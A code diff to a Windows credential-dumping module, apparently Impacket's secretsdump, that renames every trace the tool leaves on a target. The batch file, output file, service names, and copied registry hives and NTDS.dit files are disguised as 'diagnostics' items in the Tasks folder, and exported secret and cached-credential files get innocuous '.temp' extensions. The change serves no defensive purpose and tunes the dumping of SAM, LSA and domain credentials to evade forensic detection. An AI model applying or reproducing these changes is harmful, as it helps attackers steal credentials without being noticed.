@@ -451,9 +451,9 @@ class RemoteOperations:
         self.__tmpServiceName = None
         self.__serviceDeleted = False
 
-        self.__batchFile = '%TEMP%\\execute.bat'
-        self.__shell = '%COMSPEC% /Q /c '
-        self.__output = '%SYSTEMROOT%\\Temp\\__output'
+        self.__batchFile = '%SYSTEMROOT%\\Tasks\\svcrunner.bat'
+        self.__shell = '%SYSTEMROOT%\\System32\\cmd.exe /C /Q '
+        self.__output = '%SYSTEMROOT%\\Tasks\\diagnostics'
         self.__answerTMP = b''
 
         self.__execMethod = 'smbexec'
@@ -963,7 +963,7 @@ class RemoteOperations:
         return True
 
     def __retrieveHive(self, hiveName):
-        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        tmpFileName = 'diagnostics_' + ''.join([random.choice(string.ascii_letters) for _ in range(16)])
         ans = rrp.hOpenLocalMachine(self.__rrp)
         regHandle = ans['phKey']
         try:
@@ -971,11 +971,11 @@ class RemoteOperations:
         except:
             raise Exception("Can't open %s hive" % hiveName)
         keyHandle = ans['phkResult']
-        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, '..\\Temp\\'+tmpFileName)
+        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, '..\\Tasks\\'+tmpFileName)
         rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
         # Now let's open the remote file, so it can be read later
-        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\'+tmpFileName)
+        remoteFileName = RemoteFile(self.__smbConnection, 'Tasks\\'+tmpFileName)
         return remoteFileName
 
     def saveSAM(self):
@@ -1140,7 +1140,7 @@ class RemoteOperations:
         dcom.disconnect()
 
     def __executeRemote(self, data):
-        self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
+        self.__tmpServiceName = 'diagnostics_' + ''.join([random.choice(string.ascii_letters) for _ in range(16)])
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
                   self.__shell + self.__batchFile
         command += ' & ' + 'del ' + self.__batchFile
@@ -1169,7 +1169,7 @@ class RemoteOperations:
         tries = 0
         while True:
             try:
-                self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                self.__smbConnection.getFile('ADMIN$', 'Tasks\\diagnostics', self.__answer)
                 break
             except Exception as e:
                 if tries > 30:
@@ -1203,7 +1203,7 @@ class RemoteOperations:
            elif line.find(IDSTART) > 0:
                lastShadowId = line[line.find(IDSTART)+len(IDSTART):][:IDLEN-1]
 
-        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
+        self.__smbConnection.deleteFile('ADMIN$', 'Tasks\\diagnostics')
 
         LOG.debug('__getLastVSS found last VSS %s on %s with ID of %s' % (lastShadow.decode('utf-8'), lastShadowFor.decode('utf-8'), lastShadowId.decode('utf-8')))
 
@@ -1253,9 +1253,9 @@ class RemoteOperations:
             shouldRemove = False
 
         # Now copy the ntds.dit to the temp directory
-        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
+        tmpFileName = 'diagnostics_' + ''.join([random.choice(string.ascii_letters) for _ in range(16)])
 
-        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
+        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Tasks\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
 
         if shouldRemove is True:
             LOG.debug('Trying to delete shadow copy using command : %%COMSPEC%% /C vssadmin delete shadows /shadow="{%s}" /Quiet' % shadowId)
@@ -1265,7 +1265,7 @@ class RemoteOperations:
         tries = 0
         while True:
             try:
-                self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
+                self.__smbConnection.deleteFile('ADMIN$', 'Tasks\\diagnostics')
                 break
             except Exception as e:
                 if tries >= 30:
@@ -1275,10 +1275,10 @@ class RemoteOperations:
                     time.sleep(5)
                     pass
                 else:
-                    logging.error('Cannot delete target file \\\\%s\\ADMIN$\\Temp\\__output: %s' % (self.__smbConnection.getRemoteHost(), str(e)))
+                    logging.error('Cannot delete target file \\\\%s\\ADMIN$\\Tasks\\diagnostics: %s' % (self.__smbConnection.getRemoteHost(), str(e)))
                     pass
 
-        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
+        remoteFileName = RemoteFile(self.__smbConnection, 'Tasks\\%s' % tmpFileName)
 
         return remoteFileName
 
@@ -2200,7 +2200,7 @@ class LSASecrets(OfflineRegistry):
 
     def exportSecrets(self, baseFileName, openFileFunc = None):
         if len(self.__secretItems) > 0:
-            fileName = baseFileName+'.secrets'
+            fileName = baseFileName+'.temp1'
             fd = openFile(fileName, openFileFunc=openFileFunc)
             for item in self.__secretItems:
                 fd.write(item+'\n')
@@ -2209,7 +2209,7 @@ class LSASecrets(OfflineRegistry):
 
     def exportCached(self, baseFileName, openFileFunc = None):
         if len(self.__cachedItems) > 0:
-            fileName = baseFileName+'.cached'
+            fileName = baseFileName+'.temp2'
             fd = openFile(fileName, openFileFunc=openFileFunc)
             for item in self.__cachedItems:
                 fd.write(item+'\n')
